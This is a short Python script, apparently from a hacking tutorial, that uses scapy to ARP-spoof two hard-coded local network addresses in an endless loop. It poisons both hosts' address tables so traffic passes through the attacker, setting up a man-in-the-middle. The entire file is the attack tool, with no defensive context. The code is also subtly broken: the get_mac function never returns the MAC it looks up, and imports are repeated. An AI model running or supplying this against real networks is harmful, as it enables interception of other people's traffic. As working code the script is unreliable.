#!/usr/bin/env python
import sys
import time

import scapy.all as scapy
import time
import sys


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)  #Creating an arp packet
    scapy.send(packet, verbose=False)

sent_packet_count = 0
try:
    while True:
        spoof("192.168.29.139", "192.168.29.2")
        spoof("192.168.29.2", "192.168.29.139")
        sent_packet_count = sent_packet_count + 2
        print("\r[+]Packet sent: " + str(
            sent_packet_count)),  # For Python3 use print("\r[+]Packet sent: " + str(sent_packet_count), end = "")
        sys.stdout.flush()  # For python3 this isn't required
        time.sleep(2)
except KeyboardInterrupt:
    print("[+]Detected CTRL+C....Quitting")